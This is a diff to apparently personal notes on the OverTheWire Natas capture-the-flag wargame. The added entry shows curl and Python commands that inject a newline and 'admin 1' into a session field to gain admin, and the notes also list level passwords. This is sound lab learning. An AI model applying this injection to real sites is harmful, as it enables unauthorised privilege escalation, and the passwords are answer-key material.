@@ -146,3 +146,18 @@ sequential cookie, just remember to `s.cookies.clear()` before get.\
 
 #### [sc] l20.slOKYGsjlJhaqKliGvrgWAzln0JyrWao 281
 non sequential, but this is about base16, hex\
+
+#### l21.7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU
+http dont have any state, it depends on cookie\
+this level using \n to separate inputs but didnt filter "\n"\
+`curl -u natas20:PASSWORD -c cookies.txt -d "name=axmc%0Aadmin 1" http://natas20.natas.labs.overthewire.org/`\
+`curl -u natas20:PASSWORD -b cookies.txt http://natas20.natas.labs.overthewire.org/`\
+or pythons:\
+```
+ import requests
+>>> s = requests.Session()
+>>> s.auth = ('natas20', 'YOUR_PASSWORD')
+>>> s.post('http://natas20.natas.labs.overthewire.org/', data={'name': 'axmc\nadmin 1'})
+<Response [200]>
+>>> print(s.get('http://natas20.natas.labs.overthewire.org/').text)
+```
